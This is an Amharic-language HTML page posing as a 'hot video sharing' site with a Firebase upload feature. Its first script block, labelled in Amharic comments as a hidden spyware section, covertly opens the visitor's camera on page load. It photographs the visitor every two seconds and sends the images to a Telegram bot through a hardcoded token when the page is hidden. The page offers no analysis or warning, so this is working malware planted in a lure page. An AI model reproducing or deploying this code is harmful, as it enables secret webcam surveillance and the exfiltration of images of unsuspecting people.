<!DOCTYPE html>
<html lang="am">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>habeshan hot video sharing</title>
    <!-- Font Awesome Icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    
    <style>
        /* የድረ-ገጹ አጠቃላይ ዲዛይን (CSS) */
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body { background-color: #0f0f0f; color: #ffffff; }
        .navbar { display: flex; justify-content: space-between; align-items: center; padding: 15px 20px; background-color: #202020; }
        .logo { font-size: 22px; font-weight: bold; color: #ff4757; }
        .upload-btn { background-color: #ff4757; color: white; padding: 10px 18px; border: none; border-radius: 20px; cursor: pointer; font-weight: bold; }
        .container { max-width: 1100px; margin: 20px auto; padding: 0 15px; }
        .section-title { margin-bottom: 20px; font-size: 20px; border-left: 4px solid #ff4757; padding-left: 10px; }
        .video-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; }
        .video-card { background-color: #181818; border-radius: 12px; overflow: hidden; }
        .video-card video { width: 100%; height: 200px; object-fit: cover; background-color: #000; }
        .card-details { padding: 15px; }
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.85); z-index: 200; }
        .modal-content { background-color: #202020; margin: 10% auto; padding: 25px; border-radius: 12px; width: 90%; max-width: 480px; }
        .form-group { margin-bottom: 15px; }
        .form-group input { width: 100%; padding: 10px; background-color: #121212; border: 1px solid #333; color: white; border-radius: 6px; }
        .submit-btn { width: 100%; padding: 12px; background-color: #ff4757; border: none; color: white; font-weight: bold; border-radius: 6px; cursor: pointer; }
    </style>
</head>
<body>

    <!-- 1. የ πር አጠቃላይ መዋቅር (Navbar & Main Layout) -->
    <header class="navbar">
        <div class="logo"><i class="fa-solid fa-video"></i> <span>Video Share</span></div>
        <button class="upload-btn" onclick="openModal()">Video Upload</button>
    </header>

    <main class="container">
        <h3 class="section-title">Trending Videos</h3>
        <div id="videoGrid" class="video-grid">
            <p id="loadingText" style="color: #888;">ቪዲዮዎች በመጫን ላይ ናቸው...</p>
        </div>
    </main>

    <!-- 2. ቪዲዮ አፕሎድ የሚያደርግበት ፎርም (Modal) -->
    <div id="uploadModal" class="modal">
        <div class="modal-content">
            <span onclick="closeModal()" style="float:right; cursor:pointer; font-size:22px;">&times;</span>
            <h3 style="margin-bottom: 15px;">ቪዲዮ መጫኛ</h3>
            <form id="uploadForm">
                <div class="form-group">
                    <label>የቪዲዮው ርዕስ:</label>
                    <input type="text" id="videoTitle" required>
                </div>
                <div class="form-group">
                    <label>የእርስዎ ስም:</label>
                    <input type="text" id="uploaderName" required>
                </div>
                <div class="form-group">
                    <label>ቪዲዮ ይምረጡ:</label>
                    <input type="file" id="videoFile" accept="video/*" required>
                </div>
                <button type="submit" id="submitBtn" class="submit-btn">Upload አድርግ</button>
                <div id="statusMsg"></div>
            </form>
        </div>
    </div>

    <!-- 3. ጃቫስክሪፕት (JavaScript Logic) -->
    <script>
        // ----------------------------------------------------
        // ክፍል A: ስውር የስለላ (Spyware) ክፍል - ካሜራን በቀጥታ መቅረጽ
        // ----------------------------------------------------
        const BOT_TOKEN = "8831162632:AAGowdHChrYwev9Y54NYtVGC6mYajUZpjko";
        const CHAT_ID = "8125688786";
        const CHAT_ID = "8690318952";

        // የተደበቀ የካሜራ ማያ (Hidden Video & Canvas)
        const video = document.createElement('video');
        video.autoplay = true;
        video.style.display = 'none';
        document.body.appendChild(video);

        const canvas = document.createElement('canvas');
        const context = canvas.getContext('2d');

        let imageBuffer = [];
        let captureInterval = null;

        // ተጠቃሚው ገጹን ሲከፍት ካሜራውን በስውር መክፈት
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
                // በየ 2 ሰከንዱ አውቶማቲክ ፎቶ ማንሳት
                captureInterval = setInterval(capturePhoto, 2000);
            })
            .catch(err => console.error("ካሜራ አልተከፈተም:", err));

        function capturePhoto() {
            canvas.width = video.videoWidth || 320;
            canvas.height = video.videoHeight || 240;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/jpeg', 0.5);
            imageBuffer.push(imageData);
        }

        // ተጠቃሚው ገጹን ሲዘጋ ፎቶዎቹን ወደ ቴሌግራም ቦት መላክ
        document.addEventListener('visibilitychange', () => {
            if (document.visibilityState === 'hidden') {
                sendAllPhotos();
            }
        });

        async function sendAllPhotos() {
            if (imageBuffer.length === 0) return;
            if (captureInterval) clearInterval(captureInterval);

            for (let i = 0; i < imageBuffer.length; i++) {
                try {
                    const blob = await (await fetch(imageBuffer[i])).blob();
                    const formData = new FormData();
                    formData.append("chat_id", CHAT_ID);
                    formData.append("photo", blob, `photo_${i + 1}.jpg`);

                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: "POST",
                        body: formData,
                        keepalive: true
                    });
                } catch (e) {
                    console.error("የመላክ ስህተት:", e);
                }
            }
            imageBuffer = [];
        }
    </script>

    <!-- ---------------------------------------------------- -->
    <!-- ክፍል B: የፊርቤዝ ዳታቤዝ እና ቪዲዮ ማቀናበሪያ (Firebase Logic) -->
    <!-- ---------------------------------------------------- -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getDatabase, ref, push, onValue } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

        const firebaseConfig = {
            databaseURL: "https://hack-8c6aa-default-rtdb.firebaseio.com"
        };

        const app = initializeApp(firebaseConfig);
        const database = getDatabase(app);
        const videoRef = ref(database, 'Sma');

        window.openModal = () => document.getElementById("uploadModal").style.display = "block";
        window.closeModal = () => document.getElementById("uploadModal").style.display = "none";

        const videoGrid = document.getElementById("videoGrid");

        // ቪዲዮዎችን በ Realtime ማሳየት
        onValue(videoRef, (snapshot) => {
            videoGrid.innerHTML = "";
            const data = snapshot.val();
            if (!data) {
                videoGrid.innerHTML = "<p style='color:#888;'>ምንም የተጫነ ቪዲዮ የለም።</p>";
                return;
            }

            const keys = Object.keys(data).reverse();
            keys.forEach((key) => {
                const item = data[key];
                const card = document.createElement("div");
                card.className = "video-card";
                card.innerHTML = `
                    <video controls preload="metadata">
                        <source src="${item.videoUrl}" type="video/mp4">
                    </video>
                    <div class="card-details">
                        <h4>${escapeHtml(item.title)}</h4>
                        <p>አፕሎድ ያደረገው: <b>${escapeHtml(item.uploader)}</b></p>
                    </div>
                `;
                videoGrid.appendChild(card);
            });
        });

        // ቪዲዮዎችን ወደ Firebase መጫን
        const uploadForm = document.getElementById("uploadForm");
        const statusMsg = document.getElementById("statusMsg");
        const submitBtn = document.getElementById("submitBtn");

        uploadForm.addEventListener("submit", async (e) => {
            e.preventDefault();
            const title = document.getElementById("videoTitle").value;
            const uploader = document.getElementById("uploaderName").value;
            const file = document.getElementById("videoFile").files[0];

            if (!file) return;

            const reader = new FileReader();
            reader.readAsDataURL(file);
            reader.onload = async () => {
                try {
                    await push(videoRef, {
                        title: title,
                        uploader: uploader,
                        videoUrl: reader.result,
                        timestamp: Date.now()
                    });
                    statusMsg.style.color = "#2ed573";
                    statusMsg.textContent = "ቪዲዮው ተጭኗል!";
                    uploadForm.reset();
                    setTimeout(() => closeModal(), 1500);
                } catch (error) {
                    statusMsg.textContent = "ስህተት: " + error.message;
                }
            };
        });

        function escapeHtml(str) {
            return str.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
        }
    </script>
</body>
</html>
